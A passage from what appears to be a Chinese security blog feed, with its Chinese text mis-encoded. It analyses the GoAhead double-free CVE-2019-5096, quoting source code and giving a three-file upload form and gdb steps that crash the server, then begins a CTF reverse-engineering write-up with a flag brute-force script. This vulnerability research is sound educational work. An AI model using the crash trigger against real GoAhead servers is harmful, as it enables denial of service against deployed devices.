<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reuseConn</span><span class="params">(Webs *wp)</span>   <span class="comment">// é‡ç”¨é“¾æ¥ï¼Ÿ</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line">    assert(websValid(wp));</span><br><span class="line"></span><br><span class="line">    bufCompact(&amp;wp-&gt;rxbuf);</span><br><span class="line">    <span class="keyword">if</span> (bufLen(&amp;wp-&gt;rxbuf)) &#123;</span><br><span class="line">        socketReservice(wp-&gt;sid);</span><br><span class="line">    &#125;</span><br><span class="line">    termWebs(wp, <span class="number">1</span>);    <span class="comment">// ç»ˆæ­¢é“¾æ¥ï¼Ÿ</span></span><br><span class="line">    initWebs(wp, wp-&gt;flags &amp; (WEBS_KEEP_ALIVE | WEBS_SECURE | WEBS_HTTP11), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€è°ƒç”¨ termWebs å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">termWebs</span><span class="params">(Webs *wp, <span class="type">int</span> reuse)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Some of this is done elsewhere, but keep this here for when a shutdown is done and there are open connections.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    bufFree(&amp;wp-&gt;input);</span><br><span class="line">    bufFree(&amp;wp-&gt;output);</span><br><span class="line">    bufFree(&amp;wp-&gt;chunkbuf);</span><br><span class="line">    <span class="keyword">if</span> (!reuse) &#123;</span><br><span class="line">        bufFree(&amp;wp-&gt;rxbuf);</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;sid &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_COM_SSL</span></span><br><span class="line">            sslFree(wp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            socketDeleteHandler(wp-&gt;sid);</span><br><span class="line">            socketCloseConnection(wp-&gt;sid);</span><br><span class="line">            wp-&gt;sid = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !ME_ROM</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;putfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;putfd);</span><br><span class="line">        wp-&gt;putfd = <span class="number">-1</span>;</span><br><span class="line">        assert(wp-&gt;putname &amp;&amp; wp-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span> (rename(wp-&gt;putname, wp-&gt;filename) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            error(<span class="string">&quot;Cannot rename PUT file from %s to %s&quot;</span>, wp-&gt;putname, wp-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_CGI</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;cgifd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;cgifd);</span><br><span class="line">        wp-&gt;cgifd = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wfree(wp-&gt;cgiStdin);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    wfree(wp-&gt;clientFilename);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    websPageClose(wp);</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;timeout &gt;= <span class="number">0</span> &amp;&amp; !reuse) &#123;</span><br><span class="line">        websCancelTimeout(wp);</span><br><span class="line">    &#125;</span><br><span class="line">    wfree(wp-&gt;authDetails);</span><br><span class="line">    wfree(wp-&gt;authResponse);</span><br><span class="line">    wfree(wp-&gt;authType);</span><br><span class="line">    wfree(wp-&gt;contentType);</span><br><span class="line">    wfree(wp-&gt;cookie);</span><br><span class="line">    wfree(wp-&gt;decodedQuery);</span><br><span class="line">    wfree(wp-&gt;digest);</span><br><span class="line">    wfree(wp-&gt;ext);</span><br><span class="line">    wfree(wp-&gt;filename);</span><br><span class="line">    wfree(wp-&gt;host);</span><br><span class="line">    wfree(wp-&gt;method);</span><br><span class="line">    wfree(wp-&gt;password);</span><br><span class="line">    wfree(wp-&gt;path);</span><br><span class="line">    wfree(wp-&gt;protoVersion);</span><br><span class="line">    wfree(wp-&gt;putname);</span><br><span class="line">    wfree(wp-&gt;query);</span><br><span class="line">    wfree(wp-&gt;realm);</span><br><span class="line">    wfree(wp-&gt;referrer);</span><br><span class="line">    wfree(wp-&gt;url);</span><br><span class="line">    wfree(wp-&gt;userAgent);</span><br><span class="line">    wfree(wp-&gt;username);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    wfree(wp-&gt;boundary);</span><br><span class="line">    wfree(wp-&gt;uploadTmp);</span><br><span class="line">    wfree(wp-&gt;uploadVar);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_DIGEST</span></span><br><span class="line">    wfree(wp-&gt;cnonce);</span><br><span class="line">    wfree(wp-&gt;digestUri);</span><br><span class="line">    wfree(wp-&gt;opaque);</span><br><span class="line">    wfree(wp-&gt;nc);</span><br><span class="line">    wfree(wp-&gt;nonce);</span><br><span class="line">    wfree(wp-&gt;qop);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    hashFree(wp-&gt;vars);</span><br><span class="line">    hashFree(wp-&gt;responseCookies);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;    <span class="comment">// ä¹‹å‰å¤„ç†è¿‡çš„æ‰€æœ‰æ–‡ä»¶å¯¹è±¡</span></span><br><span class="line">        websFreeUpload(wp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°æ‰§è¡Œä¸€ç³»åˆ—çš„å†…å­˜æ¸…ç†æ“ä½œï¼Œå‰é¢çš„å¤§éƒ¨åˆ†ä»£ç æ²¡æœ‰é—®é¢˜ï¼Œæœ€åä¸€éƒ¨åˆ†ä»£ç å‡ºç°çº°æ¼</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;    <span class="comment">// ä¹‹å‰å¤„ç†è¿‡çš„æ‰€æœ‰æ–‡ä»¶å¯¹è±¡</span></span><br><span class="line">        websFreeUpload(wp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>wp-&gt;files è¡¨ç¤º hashtable ä¸­å…ƒç´ çš„ä¸ªæ•°ï¼Œæ­£å¸¸ä¸Šä¼ æ–‡ä»¶è¿™ä¸ªå­—æ®µä¼šå¤§äº 0 ï¼Œæ­¤æ—¶è°ƒç”¨å‡½æ•° websFreeUploadï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">void</span> <span class="title function_">websFreeUpload</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *up;</span><br><span class="line">    WebsKey     *s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (s = hashFirst(wp-&gt;files); s; s = hashNext(wp-&gt;files, s)) &#123;</span><br><span class="line">            up = s-&gt;content.value.symbol;</span><br><span class="line">            freeUploadFile(up);</span><br><span class="line">            <span class="keyword">if</span> (up == wp-&gt;currentFile) &#123;</span><br><span class="line">                wp-&gt;currentFile = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        hashFree(wp-&gt;files);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;currentFile) &#123;</span><br><span class="line">        freeUploadFile(wp-&gt;currentFile);</span><br><span class="line">        wp-&gt;currentFile = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;upfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;upfd);</span><br><span class="line">        wp-&gt;upfd = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ hashFirst å‡½æ•°ä» hashTable ä¸­å–å‡ºå…ƒç´ ï¼Œå¹¶å¯¹å®ƒè°ƒç”¨ freeUploadFileï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„å­˜åœ¨é—®é¢˜çš„å‡½æ•°ã€‚</p>
<p>åˆ°è¿™é‡Œæ¼æ´äº§ç”Ÿçš„åŸå› å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œä¸ºäº†æ›´åŠ ç›´è§‚çš„ç†è§£ï¼Œæˆ‘ä¿®æ”¹ä¸€ä¸‹ä¸Šé¢çš„å›¾ç‰‡ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-3.png"
                     
                ></p>
<p>ç”±äº hashtable ä¸­ä¿å­˜çš„å…ƒç´ éƒ½æ˜¯å¤„äº free çŠ¶æ€çš„ï¼Œæ‰€ä»¥åœ¨ websFreeUpload å‡½æ•°ä¸­å†æ¬¡å¯¹å®ƒä»¬æ‰§è¡Œ free æ“ä½œå°±ä¼šå¯¼è‡´ doble freeã€‚</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç¼–è¯‘å¥½ç¨‹åºï¼Œç”¨å‘½ä»¤å¯åŠ¨</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo goahead -v --home /etc/goahead /var/www/goahead</span><br></pre></td></tr></table></figure></div>

<p>ç¡®è®¤æµè§ˆå™¨è®¿é—®æ²¡æœ‰é—®é¢˜ä¹‹åï¼Œä¿®æ”¹ä½äº &#x2F;var&#x2F;www&#x2F;goahead ç›®å½•ä¸‹çš„ index.html æ–‡ä»¶å†…å®¹</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello worlds<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åç”¨æµè§ˆå™¨è®¿é—®</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-4.png"
                     
                ></p>
<p>é€‰æ‹©ä¸‰ä¸ªæ–‡ä»¶ä¹‹åç‚¹å‡» submit</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-5.png"
                     
                ></p>
<p>æ­¤æ—¶ç¨‹åºå·²ç»ç”±äº double free å´©æºƒã€‚</p>
<p>å¯¹æ­¤æˆ‘ä»¬å¯ä»¥ç®€å•è°ƒè¯•åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆå¯åŠ¨ goahead ç¨‹åºï¼Œç„¶åå¯åŠ¨ gdb attach ä¸Šå»ï¼Œåœ¨ websFreeUpload å‡½æ•°ä¸‹æ–­ç‚¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b websFreeUpload </span><br></pre></td></tr></table></figure></div>

<p>åœ¨æµè§ˆå™¨ä¸­æ­£å¸¸æ“ä½œï¼Œç‚¹å‡» submit ä¹‹å gdb ä¼šæ–­ä¸‹ï¼Œå•æ­¥è¿è¡Œï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ hashFirst å–å¾—çš„å…ƒç´ åœ°å€æ˜¯ 0xdeb940ï¼Œå–å¾—çš„ up åœ°å€ä¸º 0xdef300</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-6.png"
                     
                ></p>
<p>å†æ¬¡å–å¾—çš„å…ƒç´ åœ°å€ä¾æ—§æ˜¯ 0xdef300</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-7.png"
                     
                ></p>
<p>ç»§ç»­æ‰§è¡Œç¨‹åºå´©æºƒï¼Œè¿™é‡Œæˆ‘ç»™å‡ºå®Œæ•´çš„å‡½æ•°å´©æºƒä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-8.png"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°å’Œæˆ‘ä»¬å‰æ–‡çš„åˆ†æç›¸åŒã€‚</p>
<h2 id="ç®€å•çš„æ€»ç»“"><a href="#ç®€å•çš„æ€»ç»“" class="headerlink" title="ç®€å•çš„æ€»ç»“"></a>ç®€å•çš„æ€»ç»“</h2><p>ç¬¬ä¸€æ¬¡åˆ†æè¿™ç§å¼€æºè½¯ä»¶ï¼Œå¦‚æœæœ‰ä»»ä½•é—®é¢˜è¿˜è¯·å„ä½å¤§ä½¬æŒ‡æ­£ã€‚</p>
<p>æœ¬æ–‡åªåˆ†æäº†è¯¥æ¼æ´çš„è§¦å‘æµç¨‹ä»¥åŠå‡½æ•°è°ƒç”¨æµç¨‹ï¼Œè‡³äºæŠ«éœ²è€…æ‰€ç§°çš„å¯é€ æˆ RCE æˆ‘ç®€å•æƒ³äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å¯åˆ©ç”¨ç©ºé—´ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œä¸è¿‡è¿˜æ˜¯çœ‹æœåŠ¡è¿è¡Œåœ¨å“ªä¸ªç³»ç»Ÿä¸Šé¢ï¼Œå¦‚æœæ˜¯ 2.27 ç­‰å«æœ‰ tcache çš„ libc å¯èƒ½å­˜åœ¨åˆ©ç”¨ç©ºé—´ï¼Œä½†æ˜¯ goahead ä¸»è¦åº”ç”¨åœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ï¼Œè‡³äºåœ¨è¿™äº›ç³»ç»Ÿèƒ½å¦ RCE è¿˜æœ‰å¾…å•†æ¦·ï¼Œå¸Œæœ›æœ‰æ€è·¯çš„å¤§ä½¬èƒ½äº¤æµä¸€ç•ªã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>ç¬¬å…«å±Šå±±ä¸œçœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›--â€œæ·±æ€æ¯â€ WP</title>
    <url>/2019/11/04/sdnisc2019/</url>
    <content><![CDATA[<p>åˆæ˜¯ä¸€å¹´çœèµ›æ—¶ï¼Œä»Šå¹´èœçš„ç¦»è°±ï¼ŒæŠŠè¿å† ç»™ç»ˆç»“äº†ï¼ŒCTF åˆæ‰“ä¸è¿‡ï¼Œç¦»ç¬¬ä¸€åå·® 20 åˆ†ï¼Œå–è¯åˆä¸ä¼šï¼Œåªèƒ½é åšåšé€†å‘è‹Ÿå‘½ï¼Œè¿˜æ˜¯æ‰“ä¸è¿‡å„ä½å¸¦å“¥ã€‚ã€‚ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cai.jpg"
                     
                ></p>
<span id="more"></span>

<h2 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h2><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ª pyc æ–‡ä»¶ï¼Œç›´æ¥ç”¨ uncompyle6 åç¼–è¯‘ä¼šæŠ¥é”™ï¼Œæç¤ºä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImportError: Unknown magic number 6432 in flag.pyc</span><br></pre></td></tr></table></figure></div>

<p>å¾ˆæ˜æ˜¾å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ª pyc æ–‡ä»¶çš„ magic num ä¸æ­£ç¡®ã€‚æœ‰å…³äº pyc æ ¼å¼çš„ç®€å•åˆ†æå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„<a href="https://wzt.ac.cn/2019/02/13/pyc-simple/">æ–‡ç« </a>ã€‚</p>
<p>ç”¨ 010 æ‰“å¼€æ–‡ä»¶å‘ç°å¤´éƒ¨çš„ magic num è¢«æ›¿æ¢æˆäº† 0x2019ï¼Œè¿™é‡Œç›´æ¥ç”Ÿæˆå¦å¤–ä¸€ä¸ª pyc æ–‡ä»¶ï¼Œå¹¶æŠŠæ–‡ä»¶å¤´çš„ magic num æŠ„å‡ºæ¥æ›¿æ¢è¿›å»å³å¯æ­£å¸¸åç¼–è¯‘ã€‚</p>
<p>åç¼–è¯‘ä¹‹åçš„ç»“æœæ˜¯</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.1</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62171)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.12 (default, Aug 22 2019, 16:36:40) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: flag.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-10-21 14:01:56</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flag:</span><br><span class="line">    Sd.append(<span class="built_in">ord</span>(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">SdSdSd</span>):</span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = <span class="built_in">int</span>(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> Sd:</span><br><span class="line">    func(SdSdSdSd)</span><br><span class="line">    <span class="built_in">print</span> SdSd,</span><br><span class="line">    SdSd = []</span><br><span class="line"><span class="comment"># okay decompiling flag.pyc</span></span><br></pre></td></tr></table></figure></div>

<p>é€»è¾‘çœ‹ä¼¼å¤æ‚ï¼Œå®é™…ä¸Š func å‡½æ•°æˆ‘ä»¬æ ¹æœ¬ä¸éœ€è¦å»åˆ†æã€‚è¿™ä¸ªè„šæœ¬ä¸»è¦çš„æ“ä½œæ˜¯éå† flag å­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ†åˆ«æ‰§è¡Œ func(char) æ“ä½œï¼Œå¹¶ä¸”è¾“å‡ºå¾—åˆ°çš„ç»“æœã€‚</p>
<p>ç”±äºé¢˜ç›®è¿˜ç»™å‡ºäº†æ­£ç¡®çš„åŠ å¯†ç»“æœï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´å°±å¥½ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.1</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62171)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.12 (default, Aug 22 2019, 16:36:40) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: flag.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-10-21 14:01:56</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flag:</span><br><span class="line">    Sd.append(<span class="built_in">ord</span>(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">SdSdSd</span>):</span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = <span class="built_in">int</span>(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">enc = [[<span class="number">102</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">12</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">12</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">102</span>],[<span class="number">102</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">98</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">102</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">14</span>]]</span><br><span class="line"><span class="comment"># for SdSdSdSd in Sd:</span></span><br><span class="line"><span class="comment">#     func(SdSdSdSd)</span></span><br><span class="line"><span class="comment">#     print SdSd,</span></span><br><span class="line"><span class="comment">#     SdSd = []</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIKLMNOPQRSTUWXYZ1234567890&quot;</span></span><br><span class="line"><span class="keyword">for</span> fuck <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment">#print(fuck)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        func(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="comment">#print(SdSd)</span></span><br><span class="line">        <span class="keyword">if</span> SdSd == fuck:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        SdSd = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling flag.pyc</span></span><br></pre></td></tr></table></figure></div>

<p>Flag: flag{eb0cf2f1bfc9990ee3d399a2bbde3dd4}</p>
<h2 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h2><p>ä»Šå¹´å¤§å®¶éƒ½å» a æ‚é¡¹ã€æµé‡åˆ†æäº†ï¼Œæˆ‘æœ‰å¹¸å•åˆ·äº†ä¸¤é“ RE é¢˜ hh </p>
<p>RE2 æ˜¯ä¸€ä¸ª exe ç¨‹åºï¼Œæ²¡æœ‰åŠ å£³ï¼Œä½†æ˜¯ç¨‹åºä¸­æœ‰ UPX æ®µï¼Œä¸è¿‡å¯¹äºåˆ†æç¨‹åºæ²¡æœ‰å½±å“ã€‚</p>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹</p>
